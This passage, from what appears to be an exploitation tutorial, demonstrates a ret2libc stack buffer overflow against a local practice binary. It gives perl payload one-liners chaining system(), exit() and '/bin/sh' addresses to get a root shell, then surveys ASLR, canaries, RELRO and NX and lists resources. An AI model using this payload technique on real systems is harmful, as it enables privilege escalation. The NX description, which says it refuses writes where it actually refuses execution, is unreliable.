0xdeadc0de\n\\xde\\xc0\\xad\\xd\n</code></pre>\n<p>We modify the command we ran earlier, adding the reversed addresses onto the end of the payload.</p>\n<pre><code>#\n# [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n#\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n@sh-4.4# whoami\nroot\n@sh-4.4# exit\nexit\n[1]    9121 segmentation fault  bin/sof \n</code></pre>\n<p>We successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the <code>exit</code> system call address instead. Doing so should give us a clean exit.</p>\n<pre><code>@gef➤  p exit\n$2 = {&#x3C;text variable, no debug info>} 0xf7e1e8f0 &#x3C;__GI_exit>\n\n@gef➤  q\n</code></pre>\n<p>Reverse exit's address</p>\n<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n⇒  raddr -a 0xf7e1e8f0 \n\\xf0\\xe8\\xe1\\xf7\n</code></pre>\n<p>And now replace the invalid return address with it in our payload.</p>\n<pre><code>#\n# [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n#\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n@sh-4.4# whoami\nroot\n@sh-4.4# exit\nexit\nth3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n⇒\n</code></pre>\n<p>And get a shell with a clean exit.</p>\n<h2>Brief overview of a few common buffer overflow protection mechanisms</h2>\n<ul>\n<li>\n<p>ASLR (Address Space Layout Randomization)</p>\n</li>\n<li>\n<p>ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.</p>\n</li>\n<li>\n<p>Canary</p>\n</li>\n<li>\n<p>Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.</p>\n</li>\n<li>\n<p>RELRO (RELocation Read-Only)</p>\n</li>\n<li>\n<p>RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.</p>\n</li>\n<li>\n<p>NX bit (Non-executable bit)</p>\n</li>\n<li>\n<p>Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.</p>\n</li>\n<li>\n<p>AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.</p>\n</li>\n<li>\n<p>Intel refers to it as the \"XD (eXecute Disabled) bit.\"</p>\n</li>\n<li>\n<p>ARM refers to it as the \"XN (eXecute Never) bit.\"</p>\n</li>\n</ul>\n<h2>Further Reading</h2>\n<ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Buffer_overflow_protection\">BOF protection</a></li>\n<li><a href=\"https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/\">Understanding Buffer Overflow Attacks</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Stack_(abstract_data_type)\">Stack - Abstract Data Type</a></li>\n<li><a href=\"http://insecure.org/stf/smashstack.html\">Smashing The Stack For Fun And Profit</a></li>\n<li><a href=\"https://0x00sec.org/search?q=stack%20overflow\">0x00 sec</a></li>\n<li><a href=\"https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf\">Black Hat - Difference between BOF preventions and weaknesses</a></li>\n<li><a href=\"https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634\">Exploit Mitigation Techniques - DEP</a></li>\n<li><a href=\"http://shellblade.net/docs/ret2libc.pdf\">Shellblade ret2libc</a></li>\n<li><a href=\"https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937\">x64 ROP</a></li>\n<li><a href=\"https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580\">UAF heap overflow</a></li>\n<li><a href=\"https://www.exploit-db.com/papers/13171/\">NOP sled</a></li>\n</ul>\n<h2>Tools</h2>\n<ul>\n<li><a href=\"https://github.com/hugsy/gef/\">GEF - GDB Enhanced Features</a></li>\n<li><a href=\"https://github.com/rootlabs/smap/\">SMAP - Shellcode Mapper</a></li>\n<li><a href=\"https://github.com/radare/radare2/\">Radare2</a></li>\n<li><a href=\"https://github.com/radareorg/cutter\">Cutter - Radare2 QT GUI</a></li>\n<li><a href=\"https://www.offensive-security.com/metasploit-unleashed/msfvenom/\">MSFvenom</a></li>\n<li><a href=\"https://github.com/Gallopsled/pwntools\">pwntools</a></li>\n<li><a href=\"http://www.unicorn-engine.org/\">Unicorn - CPU emulator</a></li>\n</ul>\n<h2>Cheatsheets</h2>\n<ul>\n<li><a href=\"https://i.imgur.com/Xe1m6C3.png\">Memory Segmentation</a></li>\n<li><a href=\"https://i.imgur.com/ewrWkEa.png\">Reverse Engineering</a></li>\n<li><a href=\"https://github.com/radare/radare2/blob/master/doc/intro.md\">radare2</a></li>\n</ul>\n<h2>Other</h2>\n<ul>\n<li><a href=\"http://shell-storm.org/shellcode/\">Shellcode Database</a></li>\n<li><a href=\"https://sourceware.org/gdb/current/onlinedocs/gdb/\">GDB documentation</a></li>\n<li><a href=\"http://gef.readthedocs.io/en/master/\">GEF documentation</a></li>\n<li><a href=\"http://asm.sourceforge.net/syscall.html\">Linux 32bit syscalls</a></li>\n</ul>\n"},"__N_SSG":true}